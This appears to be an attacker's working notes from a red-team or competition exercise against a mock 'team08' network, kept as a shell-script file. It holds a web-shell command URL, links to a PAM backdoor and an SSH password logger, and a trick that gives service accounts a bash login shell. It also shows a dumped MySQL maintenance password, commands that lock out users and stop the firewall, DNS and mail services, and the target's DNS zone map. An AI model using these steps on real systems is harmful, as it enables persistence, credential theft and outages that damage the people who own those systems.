#!/bin/bash

http://185.78.45.20/wordpress/?cmd=whoami


https://github.com/zephrax/linux-pam-backdoor/blob/master/backdoor.sh

symlinked /usr/bin/nologin and /bin/false to /bin/bash on .20

root@DB2:/etc/mysql# cat debian.cnf
# Automatically generated for Debian scripts. DO NOT TOUCH!
[client]
host     = localhost
user     = debian-sys-maint
password = DIEwey3GgHoQ3Fao
socket   = /var/run/mysqld/mysqld.sock
[mysql_upgrade]
host     = localhost
user     = debian-sys-maint
password = DIEwey3GgHoQ3Fao
socket   = /var/run/mysqld/mysqld.sock
basedir  = /usr


usermod -s /bin/nologin eparsons
usermod -s /bin/nologin administrator
usermod -s /bin/nologin joshua
usermod -s /bin/nologin kjames
usermod -s /bin/nologin netmon
usermod -s /bin/nologin secmon
usermod -s /bin/nologin devteam

root@NS1:/tmp# service postfix stop
 * Stopping Postfix mail Transport Agent postfix
root@NS1:/tmp# service ufw stop
ufw stop/waiting
root@NS1:/tmp# service snmpd stop
 * Stopping network management services:
root@NS1:/tmp# service openbsd-inetd stop
root@NS1:/tmp# service bind9 stop
 * Stopping domain name service ... bind9


https://github.com/cameron-gagnon/ssh_pass_logging

zone "team08.higherlearning.com" {
        type master;
        file "/etc/bind/zones/db.team08.higherlearning.com";    #zone file path
        allow-transfer { 80.100.208.70; };      #Transfer to other higherlearning Servers
        notify yes;
        also-notify { 80.100.208.70; };
};
zone "45.78.185.in-addr.arpa" {
        type master;
        file "/etc/bind/zones/db.45.78.185";    #185.78.45.70/22
        allow-transfer { 80.100.208.70; };      #ns2 Public IP.
        notify yes;
        also-notify { 80.100.208.70; };
};
zone "208.100.80.in-addr.arpa" {
        type master;
        file "/etc/bind/zones/db.208.100.80";   #80.100.208.0/24
        allow-transfer { 80.100.208.70; };      #ns2 Public IP.
        notify yes;
        also-notify { 80.100.208.70; };
};
zone "8.16.172.in-addr.arpa" {
        type master;
        file "etc/bind/zones/db.8.16.172";      #172.16.8.0/24
        allow-transfer { 80.100.208.70; };      #ns2 Public IP
        notify yes;
        also-notify { 80.100.208.70; };
};

root@NS1:/etc/bind# cat /etc/bind/zones/db.team08.higherlearning.com
;
; BIND data file for local loopback interface
;
$TTL    60
@       IN      SOA     ns1.team08.higherlearning.com.  admin.higherlearning.com. (
                      202002042         ; Serial
                            300         ; Refresh
                            600         ; Retry
                            900         ; Expire
                            600 )       ; Negative Cache TTL
;
; name servers - NS records
        IN      NS      ns1.team08.higherlearning.com.
        IN      NS      ns2.team08.higherlearning.com.
; Datacenter 1
WEB     IN      A       185.78.45.20
WWW     IN      CNAME   185.78.45.20
FTP     IN      A       185.78.45.30
DB      IN      A       185.78.45.40
APP     IN      A       185.78.45.50
docker  IN      A       185.78.45.73
ns1     IN      A       185.78.45.70
DC01    IN      A       185.78.45.80
; Datacenter 2
WWW2    IN      CNAME   80.100.208.20
WEB2    IN      A       80.100.208.20
FTP2    IN      A       80.100.208.30
DB2     IN      A       80.100.208.40
APP2    IN      A       80.100.208.50
ns2     IN      A       80.100.208.70
docker2 IN      A       80.100.208.73
DC02    IN      A       80.100.208.80
; HomeOffice
DC      IN      A       172.16.8.23
DCINT   IN      CNAME   172.16.8.23
mail    IN      A       172.16.8.25
